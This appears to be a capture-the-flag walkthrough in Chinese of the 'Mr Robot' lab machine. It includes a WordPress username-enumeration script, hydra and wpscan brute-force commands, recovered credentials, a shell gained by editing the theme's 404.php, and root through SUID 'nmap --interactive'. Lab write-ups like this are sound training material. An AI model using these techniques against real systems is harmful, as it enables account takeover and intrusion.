# mrRoBot

![image-20200617202409740](assets/mrRobot.assets/image-20200617202409740.png)

![image-20200617202634944](assets/mrRobot.assets/image-20200617202634944.png)

80

![image-20200617203152363](assets/mrRobot.assets/image-20200617203152363.png)



443

![image-20200617203214681](assets/mrRobot.assets/image-20200617203214681.png)





![image-20200617203329701](assets/mrRobot.assets/image-20200617203329701.png)

![image-20200617203436652](assets/mrRobot.assets/image-20200617203436652.png)

打开是个字典。剩下那个是key

![image-20200617203718625](assets/mrRobot.assets/image-20200617203718625.png)

![image-20200617203846811](assets/mrRobot.assets/image-20200617203846811.png)

![image-20200617204101932](assets/mrRobot.assets/image-20200617204101932.png)

![image-20200617204241641](assets/mrRobot.assets/image-20200617204241641.png)

![image-20200617204658472](assets/mrRobot.assets/image-20200617204658472.png)



![image-20200617210402372](assets/mrRobot.assets/image-20200617210402372.png)

```html
POST /wp-login.php HTTP/1.1
Host: 192.168.43.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.43.4/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Connection: close
Cookie: s_cc=true; s_fid=3049ECE10F0CB5E8-14747522386CD7B4; s_nr=1592440903180; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=ss&pwd=ddd&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.43.4%2Fwp-admin%2F&testcookie=1
```



如果用两个字典同时暴力破解用户名和密码成本太高，参考到wordpress会回显用户名是否正确。可以写一个只暴力测试用户名的python脚本/

```bash
cat fsocity.dic > fsocity.txt
vim weblogin_username_force.py
```



```python
import requests

open_file = open('fsocity.txt', 'r')		
temp = open_file.read().splitlines()		#读字典
count = 0
for username in temp:
    payload = {'log': '{0}'.format(username), 'pwd': 'dummy'}
    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
    cookies = dict(wordpress_test_cookie='WP+Cookie+check')
    r = requests.post("http://192.168.43.4/wp-login.php", data=payload, headers=headers, cookies=cookies)		#构建包
    if "Invalid username" not in r.text:
        print username
```

![image-20200617211255118](assets/mrRobot.assets/image-20200617211255118.png)

所以用户名是Elliot

再用这个用户名去暴力密码

```bash
sudo hydra -l elliot -P fsocity.txt 192.168.43.4 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

也可以使用wpscan

```bash
wpscan --url http://192.168.43.4 -P fsocity.txt -U elliot --force
```

![image-20200618025547073](assets/mrRobot.assets/image-20200618025547073.png)

```bash
elliot:ER28-0652
```

![image-20200617214438033](assets/mrRobot.assets/image-20200617214438033.png)

老套路，改404

![image-20200617214725471](assets/mrRobot.assets/image-20200617214725471.png)

```bash
http://192.168.43.4/wp-content/themes/twentyfifteen/404.php
```

也可以读取任意不存在网页。也可以读404.php都可以获得shell

![image-20200617221145713](assets/mrRobot.assets/image-20200617221145713.png)



![image-20200617221935707](assets/mrRobot.assets/image-20200617221935707.png)



```bash
robot:c3fcd3d76192e4007dfb496cca67e13b
```

![image-20200617222051159](assets/mrRobot.assets/image-20200617222051159.png)

```bash
robot：abcdefghijklmnopqrstuvwxyz
```

![image-20200617223832076](assets/mrRobot.assets/image-20200617223832076.png)

```bash
find / -perm -4000 2>/dev/null
```

![image-20200617225339961](assets/mrRobot.assets/image-20200617225339961.png)

```
nmap --interactive
```

![image-20200617225715864](assets/mrRobot.assets/image-20200617225715864.png)